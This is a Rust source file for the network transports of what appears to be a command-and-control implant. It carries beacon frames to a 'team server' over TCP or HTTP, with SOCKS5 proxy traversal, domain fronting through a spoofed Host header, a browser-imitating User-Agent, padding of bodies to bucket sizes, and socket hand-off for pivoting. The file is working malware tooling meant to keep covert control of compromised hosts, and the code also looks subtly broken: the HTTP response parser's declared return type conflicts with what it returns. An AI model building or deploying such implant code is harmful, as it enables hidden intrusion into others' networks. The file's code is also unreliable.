//! Transports. Every transport carries whole umbra/v1 frames; the session and
//! message handling above this layer is identical for all of them.
//!
//! * `TcpChannel`  -- one connection per beacon cycle, frames in both directions.
//! * `HttpChannel` -- frames inside HTTP POST bodies (plain HTTP/1.1 written by
//!   hand, so no TLS/async runtime dependency; put it behind a TLS-terminating
//!   reverse proxy or an HTTPS redirector for production).

use std::io::{self, Read, Write};
use std::net::ToSocketAddrs;
use std::time::Duration;

/// The socket type the channels use. It is re-exported so the pivot code can
/// hand a connected socket over to another component.
pub use std::net::TcpStream;

pub trait Channel {
    fn write_frame(&mut self, frame: &[u8]) -> io::Result<()>;
    fn read_frame(&mut self) -> io::Result<Vec<u8>>;
    fn close(&mut self);
    /// Push any buffered frames to the server (no-op for stream transports).
    fn flush(&mut self) -> io::Result<()> {
        Ok(())
    }
    /// HTTP transports record the session id here so later requests can be
    /// routed to the same server-side session.
    fn set_session_id(&mut self, _sid: &str) {}
    /// The number of bytes that wait for the next request. The HTTP
    /// transport uses it to pad a body to a bucket size.
    fn pending_len(&self) -> usize {
        0
    }
    /// Take the underlying socket, when the transport owns one. The pivot
    /// callback uses it to keep the connection after the handshake.
    fn take_stream(&mut self) -> Option<TcpStream> {
        None
    }
}

const CONNECT_TIMEOUT: Duration = Duration::from_secs(15);
const IO_TIMEOUT: Duration = Duration::from_secs(60);

// ---------------------------------------------------------------------------
// TCP
// ---------------------------------------------------------------------------

pub struct TcpChannel {
    addr: String,
    proxy: String,
    stream: Option<TcpStream>,
}

impl TcpChannel {
    pub fn new(addr: &str) -> Self {
        TcpChannel { addr: addr.to_string(), proxy: String::new(), stream: None }
    }

    /// Route the connection through a SOCKS5 proxy.
    ///
    /// A beacon in a network that only lets a proxy out uses this: the
    /// implant speaks to the proxy, and the proxy carries the traffic to
    /// the team server.
    pub fn with_proxy(mut self, proxy: &str) -> Self {
        self.proxy = proxy.trim().to_string();
        self
    }

    pub fn connect(&mut self) -> io::Result<()> {
        if !self.proxy.is_empty() {
            return self.connect_via_proxy();
        }
        let mut last: Option<io::Error> = None;
        for sa in self.addr.to_socket_addrs()? {
            match TcpStream::connect_timeout(&sa, CONNECT_TIMEOUT) {
                Ok(s) => {
                    s.set_read_timeout(Some(IO_TIMEOUT))?;
                    s.set_write_timeout(Some(IO_TIMEOUT))?;
                    s.set_nodelay(true)?;
                    self.stream = Some(s);
                    return Ok(());
                }
                Err(e) => last = Some(e),
            }
        }
        Err(last.unwrap_or_else(|| io::Error::new(io::ErrorKind::AddrNotAvailable, "no address")))
    }

    /// Connect to the proxy and let it carry the traffic to the server.
    fn connect_via_proxy(&mut self) -> io::Result<()> {
        let mut last: Option<io::Error> = None;
        for sa in self.proxy.to_socket_addrs()? {
            match TcpStream::connect_timeout(&sa, CONNECT_TIMEOUT) {
                Ok(mut s) => {
                    s.set_read_timeout(Some(IO_TIMEOUT))?;
                    s.set_write_timeout(Some(IO_TIMEOUT))?;
                    s.set_nodelay(true)?;
                    if let Err(e) = socks5_connect(&mut s, &self.addr) {
                        last = Some(e);
                        continue;
                    }
                    self.stream = Some(s);
                    return Ok(());
                }
                Err(e) => last = Some(e),
            }
        }
        Err(last.unwrap_or_else(|| {
            io::Error::new(io::ErrorKind::AddrNotAvailable, "the proxy is unreachable")
        }))
    }
}

/// The SOCKS5 handshake: no authentication, then a CONNECT to the target.
fn socks5_connect(stream: &mut TcpStream, target: &str) -> io::Result<()> {
    // The greeting: version 5, one method, "no authentication".
    stream.write_all(&[0x05, 0x01, 0x00])?;
    stream.flush()?;
    let mut reply = [0u8; 2];
    stream.read_exact(&mut reply)?;
    if reply[0] != 0x05 {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "the proxy does not speak SOCKS5",
        ));
    }
    if reply[1] != 0x00 {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            "the proxy wants an authentication the implant does not have",
        ));
    }
    // The request: CONNECT to the address of the team server.
    let (host, port) = split_target(target);
    let mut request: Vec<u8> = vec![0x05, 0x01, 0x00];
    if let Ok(ip) = host.parse::<std::net::Ipv4Addr>() {
        request.push(0x01);
        request.extend_from_slice(&ip.octets());
    } else if let Ok(ip) = host.parse::<std::net::Ipv6Addr>() {
        request.push(0x04);
        request.extend_from_slice(&ip.octets());
    } else {
        if host.len() > 255 {
            return Err(io::Error::new(io::ErrorKind::InvalidInput, "the host is too long"));
        }
        request.push(0x03);
        request.push(host.len() as u8);
        request.extend_from_slice(host.as_bytes());
    }
    request.extend_from_slice(&port.to_be_bytes());
    stream.write_all(&request)?;
    stream.flush()?;

    // The reply: the version, the status and the bound address.
    let mut head = [0u8; 4];
    stream.read_exact(&mut head)?;
    if head[1] != 0x00 {
        return Err(io::Error::new(
            io::ErrorKind::ConnectionRefused,
            format!("the proxy refused the connection ({})", head[1]),
        ));
    }
    let rest = match head[3] {
        0x01 => 4 + 2,
        0x04 => 16 + 2,
        0x03 => {
            let mut len = [0u8; 1];
            stream.read_exact(&mut len)?;
            len[0] as usize + 2
        }
        _ => {
            return Err(io::Error::new(
                io::ErrorKind::InvalidData,
                "the proxy sent a bad address",
            ))
        }
    };
    let mut tail = vec![0u8; rest];
    stream.read_exact(&mut tail)?;
    Ok(())
}

/// Split "host:port" into the host and the port.
fn split_target(target: &str) -> (String, u16) {
    match target.rsplit_once(':') {
        Some((host, port)) => (
            host.trim_matches(|c| c == '[' || c == ']').to_string(),
            port.parse().unwrap_or(443),
        ),
        None => (target.to_string(), 443),
    }
}

impl Channel for TcpChannel {
    fn write_frame(&mut self, frame: &[u8]) -> io::Result<()> {
        let s = self
            .stream
            .as_mut()
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotConnected, "tcp not connected"))?;
        s.write_all(frame)?;
        s.flush()
    }

    fn read_frame(&mut self) -> io::Result<Vec<u8>> {
        let s = self
            .stream
            .as_mut()
            .ok_or_else(|| io::Error::new(io::ErrorKind::NotConnected, "tcp not connected"))?;
        crate::wire::read_frame(s)
    }

    fn flush(&mut self) -> io::Result<()> {
        match self.stream.as_mut() {
            Some(s) => s.flush(),
            None => Ok(()),
        }
    }

    fn close(&mut self) {
        if let Some(s) = self.stream.take() {
            let _ = s.shutdown(std::net::Shutdown::Both);
        }
    }
}

// ---------------------------------------------------------------------------
// HTTP
// ---------------------------------------------------------------------------

pub struct HttpChannel {
    host: String,
    port: u16,
    path: String,
    /// The Host header of the requests. It is empty for "host:port", and a
    /// value for domain fronting: the beacon talks to a CDN while the
    /// request still names the origin.
    host_header: String,
    sid: Option<String>,
    out: Vec<u8>,
    pending: std::collections::VecDeque<Vec<u8>>,
    /// Kept across the POSTs of one beacon cycle (handshake, CHECKIN,
    /// results+BYE), so a cycle costs one TCP connect instead of three. The
    /// channel is dropped when the cycle ends, so no idle socket outlives it.
    stream: Option<TcpStream>,
}

impl HttpChannel {
    /// `addr` is "host:port"; `path` defaults to /api/v1/beacon.
    /// `host_header` overrides the Host header (domain fronting); an empty
    /// value means "host:port".
    pub fn new(addr: &str, path: &str, host_header: &str) -> io::Result<Self> {
        let (host, port) = match addr.rsplit_once(':') {
            Some((h, p)) => (
                h.to_string(),
                p.parse::<u16>()
                    .map_err(|_| io::Error::new(io::ErrorKind::InvalidInput, "bad port"))?,
            ),
            None => return Err(io::Error::new(io::ErrorKind::InvalidInput, "addr must be host:port")),
        };
        Ok(HttpChannel {
            host,
            port,
            path: if path.is_empty() { "/api/v1/beacon".to_string() } else { path.to_string() },
            host_header: host_header.to_string(),
            sid: None,
            out: Vec::new(),
            pending: std::collections::VecDeque::new(),
            stream: None,
        })
    }

    fn connect(&self) -> io::Result<TcpStream> {
        let mut stream = TcpStream::connect_timeout(
            &(self.host.as_str(), self.port)
                .to_socket_addrs()?
                .next()
                .ok_or_else(|| io::Error::new(io::ErrorKind::AddrNotAvailable, "no address"))?,
            CONNECT_TIMEOUT,
        )?;
        stream.set_read_timeout(Some(IO_TIMEOUT))?;
        stream.set_write_timeout(Some(IO_TIMEOUT))?;
        Ok(stream)
    }

    fn target(&self) -> String {
        match &self.sid {
            Some(sid) => format!("{}/{}", self.path, sid),
            None => self.path.clone(),
        }
    }

    fn post(&mut self, allow_empty: bool) -> io::Result<()> {
        let body = std::mem::take(&mut self.out);
        let target = self.target();
        if self.stream.is_none() {
            self.stream = Some(self.connect()?);
        }

        // A reused socket can already be closed by the server (idle timeout,
        // restart), which shows up as a failed write or a premature EOF. Drop
        // it and try once on a fresh connection. A retry may re-send the
        // frames of this POST; that is safe here because every agent-to-server
        // frame is idempotent (RESULT is keyed by task id, CHECKIN and BYE
        // carry no state).
        let mut attempt = 0;
        let (status, payload) = loop {
            let mut stream = self.stream.take().expect("stream checked above");
            let result = exchange(
                &mut stream,
                &target,
                &self.host,
                &self.host_header,
                self.port,
                &body,
            );
            match result {
                Ok((status, payload, reusable)) => {
                    if reusable {
                        self.stream = Some(stream);
                    }
                    break (status, payload);
                }
                Err(e) if attempt == 0 && is_stale_connection(&e) => {
                    attempt += 1;
                    self.stream = Some(self.connect()?);
                }
                Err(e) => return Err(e),
            }
        };

        if status != 200 {
            return Err(io::Error::new(
                io::ErrorKind::ConnectionAborted,
                format!("http status {status}"),
            ));
        }
        let frames = crate::wire::split_frames(&payload)?;
        if frames.is_empty() && !allow_empty {
            return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "empty response body"));
        }
        for f in frames {
            self.pending.push_back(f);
        }
        Ok(())
    }
}

impl Channel for HttpChannel {
    fn write_frame(&mut self, frame: &[u8]) -> io::Result<()> {
        self.out.extend_from_slice(frame);
        Ok(())
    }

    fn read_frame(&mut self) -> io::Result<Vec<u8>> {
        if self.pending.is_empty() {
            if self.out.is_empty() {
                // Nothing to send and nothing buffered: the server never
                // answers an empty POST, so fail instead of stalling.
                return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "no frames to exchange"));
            }
            self.post(false)?;
        }
        self.pending
            .pop_front()
            .ok_or_else(|| io::Error::new(io::ErrorKind::UnexpectedEof, "no frames pending"))
    }

    fn flush(&mut self) -> io::Result<()> {
        if self.out.is_empty() {
            return Ok(());
        }
        self.post(true)
    }

    fn close(&mut self) {
        self.out.clear();
        self.pending.clear();
        self.stream = None;
    }

    fn set_session_id(&mut self, sid: &str) {
        self.sid = Some(sid.to_string());
    }

    fn pending_len(&self) -> usize {
        self.out.len()
    }
}

/// Send one request on an open connection and read its response.
///
/// Returns `(status, body, reusable)`; `reusable` is false when the server
/// ended the connection (chunked or close-delimited body, `Connection: close`),
/// in which case the socket must not be used again.
fn exchange(
    stream: &mut TcpStream,
    target: &str,
    host: &str,
    host_header: &str,
    port: u16,
    body: &[u8],
) -> io::Result<(u16, Vec<u8>, bool)> {
    // The Host header is either the configured one (domain fronting) or
    // "host:port".
    let host = if host_header.is_empty() {
        crate::config::host_port(host, port)
    } else {
        host_header.to_string()
    };
    let header = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n\
         Content-Type: application/octet-stream\r\nContent-Length: {}\r\n\
         Connection: keep-alive\r\n\r\n",
        target,
        host,
        body.len()
    );
    stream.write_all(header.as_bytes())?;
    stream.write_all(body)?;
    stream.flush()?;
    read_http_response(stream)
}

/// True for the errors a half-closed, reused connection produces.
fn is_stale_connection(e: &io::Error) -> bool {
    matches!(
        e.kind(),
        io::ErrorKind::BrokenPipe
            | io::ErrorKind::ConnectionReset
            | io::ErrorKind::ConnectionAborted
            | io::ErrorKind::NotConnected
            | io::ErrorKind::UnexpectedEof
            | io::ErrorKind::WouldBlock
    )
}

/// Read one HTTP/1.1 response and return (status, body, reusable).
fn read_http_response<R: Read>(r: &mut R) -> io::Result<(u16, Vec<u8>)> {
    let mut buf = Vec::with_capacity(8192);
    let mut chunk = [0u8; 4096];

    // Read until the end of the header block.
    let header_end;
    loop {
        if let Some(pos) = find_subslice(&buf, b"\r\n\r\n") {
            header_end = pos + 4;
            break;
        }
        let n = r.read(&mut chunk)?;
        if n == 0 {
            return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "no http headers"));
        }
        buf.extend_from_slice(&chunk[..n]);
        if buf.len() > 64 * 1024 {
            return Err(io::Error::new(io::ErrorKind::InvalidData, "http headers too large"));
        }
    }

    let head = String::from_utf8_lossy(&buf[..header_end]).to_string();
    let mut lines = head.split("\r\n");
    let status_line = lines.next().unwrap_or("");
    let status: u16 = status_line
        .split_whitespace()
        .nth(1)
        .and_then(|s| s.parse().ok())
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidData, "bad status line"))?;

    let mut content_length: Option<usize> = None;
    let mut chunked = false;
    let mut close = false;
    for line in lines {
        let lower = line.to_ascii_lowercase();
        if let Some(v) = lower.strip_prefix("content-length:") {
            content_length = v.trim().parse::<usize>().ok();
        }
        if lower.starts_with("transfer-encoding:") && lower.contains("chunked") {
            chunked = true;
        }
        if let Some(v) = lower.strip_prefix("connection:") {
            close = v.trim() == "close";
        }
    }

    let mut body = buf[header_end..].to_vec();
    if chunked {
        // Read to EOF, then de-chunk.
        loop {
            let n = r.read(&mut chunk)?;
            if n == 0 {
                break;
            }
            body.extend_from_slice(&chunk[..n]);
        }
        return Ok((status, dechunk(&body)?, false));
    }
    match content_length {
        Some(len) => {
            while body.len() < len {
                let n = r.read(&mut chunk)?;
                if n == 0 {
                    return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "short body"));
                }
                body.extend_from_slice(&chunk[..n]);
            }
            body.truncate(len);
            // A length-delimited body is exactly consumed, so the socket is
            // still positioned at the next response.
            return Ok((status, body, !close));
        }
        None => loop {
            let n = r.read(&mut chunk)?;
            if n == 0 {
                break;
            }
            body.extend_from_slice(&chunk[..n]);
        },
    }
    Ok((status, body, false))
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || haystack.len() < needle.len() {
        return None;
    }
    haystack.windows(needle.len()).position(|w| w == needle)
}

fn dechunk(body: &[u8]) -> io::Result<Vec<u8>> {
    let mut out = Vec::with_capacity(body.len());
    let mut pos = 0usize;
    loop {
        let line_end = match find_subslice(&body[pos..], b"\r\n") {
            Some(p) => pos + p,
            None => break,
        };
        let size_str = String::from_utf8_lossy(&body[pos..line_end]).to_string();
        let size_str = size_str.split(';').next().unwrap_or("").trim().to_string();
        let size = usize::from_str_radix(&size_str, 16)
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "bad chunk size"))?;
        pos = line_end + 2;
        if size == 0 {
            break;
        }
        if pos + size > body.len() {
            return Err(io::Error::new(io::ErrorKind::UnexpectedEof, "short chunk"));
        }
        out.extend_from_slice(&body[pos..pos + size]);
        pos += size + 2; // skip trailing CRLF
        if pos > body.len() {
            break;
        }
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dechunk_roundtrip() {
        let raw = b"4\r\nWiki\r\n5\r\npedia\r\n0\r\n\r\n";
        assert_eq!(dechunk(raw).unwrap(), b"Wikipedia");
    }

    fn parse(raw: &[u8]) -> (u16, Vec<u8>, bool) {
        read_http_response(&mut std::io::Cursor::new(raw.to_vec())).unwrap()
    }

    #[test]
    fn length_delimited_response_is_keep_alive() {
        // Exactly one response on the wire; the body must stop at
        // Content-Length and the socket must stay usable.
        let raw = b"HTTP/1.1 200 OK\r\nContent-Length: 3\r\n\r\nabc";
        let (status, body, reusable) = parse(raw);
        assert_eq!(status, 200);
        assert_eq!(body, b"abc");
        assert!(reusable);
    }

    #[test]
    fn connection_close_is_not_reusable() {
        let raw = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
        let (_, body, reusable) = parse(raw);
        assert!(body.is_empty());
        assert!(!reusable);
    }

    #[test]
    fn chunked_response_is_not_reusable() {
        let raw = b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n3\r\nabc\r\n0\r\n\r\n";
        let (_, body, reusable) = parse(raw);
        assert_eq!(body, b"abc");
        assert!(!reusable);
    }

    #[test]
    fn stale_connection_errors_are_retryable() {
        for kind in [
            io::ErrorKind::BrokenPipe,
            io::ErrorKind::ConnectionReset,
            io::ErrorKind::UnexpectedEof,
        ] {
            assert!(is_stale_connection(&io::Error::new(kind, "x")), "{kind:?}");
        }
        assert!(!is_stale_connection(&io::Error::new(
            io::ErrorKind::InvalidData,
            "x"
        )));
    }

    #[test]
    fn finds_header_terminator() {
        let buf = b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
        assert_eq!(find_subslice(buf, b"\r\n\r\n"), Some(buf.len() - 4));
    }
}
